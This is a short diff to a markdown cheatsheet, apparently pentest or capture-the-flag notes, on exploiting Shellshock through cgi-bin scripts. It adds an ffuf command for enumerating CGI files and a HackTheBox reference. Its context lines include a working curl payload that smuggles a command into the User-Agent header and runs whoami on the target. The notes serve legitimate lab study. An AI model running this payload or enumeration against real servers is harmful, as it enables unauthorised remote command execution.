@@ -5,6 +5,13 @@ tags: [cheatsheet/web, exploit/shell-shock]
 img_path: /Cheatsheet/Web/Shellshock via cgi-bin/images
 ---
 
+
+# Enumerate CGI files
+```
+ffuf -u http://<IP>/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.cgi,.pl,.sh,.ps1,.py,.php,.php3,.exe,.bat,.dll,.vts,.cfg'
+```
+
+
 # Test
 ```
 curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<MACHINE-IP>/cgi-bin/test.cgi
@@ -21,6 +28,6 @@ curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://
 
 # Some Example
 - [TryHackMe 0day](https://youtu.be/TS_yfDqr_3s?t=1052)
-
+- HackTheBox Shocker - Initial Foothold via ShellShock
 
 
